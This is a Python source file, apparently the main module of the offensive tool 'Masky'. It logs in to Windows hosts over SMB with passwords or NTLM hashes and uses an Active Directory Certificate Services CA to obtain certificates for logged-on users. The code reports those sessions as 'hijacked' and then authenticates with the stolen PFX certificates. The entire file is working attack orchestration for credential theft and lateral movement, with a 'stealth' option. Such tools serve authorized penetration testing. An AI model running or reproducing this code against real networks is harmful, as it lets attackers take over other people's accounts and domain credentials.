import socket
import logging
from .utils.toolbox import scan_port
from .lib.smb import Smb
from .lib.cert.auth import Authenticate
from .utils.logger import add_result_level

logger = logging.getLogger("masky")


class Masky:
    def __init__(
        self,
        ca,
        user,
        template="User",
        domain=".",
        password=None,
        hashes=None,
        kerberos=False,
        dc_ip=None,
        quiet=False,
        stealth=False,
    ):
        self.__ca = ca
        self.__template = template
        self.__domain = domain
        self.__user = user
        self.__password = password
        self.__hashes = hashes
        self.__kerberos = kerberos
        self.__dc_ip = dc_ip
        self.__dc_target = None
        self.__quiet = quiet
        self.__stealth = stealth

    def __process_options(self):
        try:
            self.__dc_target = socket.gethostbyname(self.__domain)
        except:
            self.__dc_target = self.__dc_ip
        if self.__dc_target == "0.0.0.0":
            self.__dc_target = self.__dc_ip
        if not self.__dc_target:
            logger.error(
                f"The provided domain '{self.__domain}' cannot be resolved, please set the full FQDN or provide the DC IP address"
            )
            return False
        return True

    def __process_certificate(self, user_data):
        certipy_auth = Authenticate(
            self.__domain, self.__dc_ip, user_data, False, False
        )
        if certipy_auth.authenticate():
            return True
        return False

    def run(self, target):
        add_result_level()
        if self.__quiet:
            logger.disabled = True

        if not self.__process_options():
            return None

        if not scan_port(target):
            logger.info("The port tcp/445 seems not exposed, skipping this target")
            return None

        s = Smb(
            self.__domain,
            self.__user,
            password=self.__password,
            hashes=self.__hashes,
            kerberos=self.__kerberos,
            dc_target=self.__dc_target,
            stealth=self.__stealth,
        )
        rslt = None
        try:
            rslt = s.exec_masky(target, self.__ca, self.__template)
        except:
            return rslt
        if not rslt or not rslt.users:
            logger.info("No user session was hijacked")
            return None
        if len(rslt.users) == 1:
            logger.info(f"{len(rslt.users)} user session was hijacked")
        else:
            logger.info(f"{len(rslt.users)} user sessions were hijacked")

        for user_data in rslt.users:
            logger.debug(
                f"Start processing PFX of the user '{user_data.domain}\{user_data.name}'"
            )
            if not self.__process_certificate(user_data):
                logger.warn(
                    f"Fail to process gathered certificate related to the user '{user_data.domain}\{user_data.name}'"
                )
            else:
                logger.debug(
                    f"End processing PFX of the user '{user_data.domain}\{user_data.name}'"
                )
        return rslt
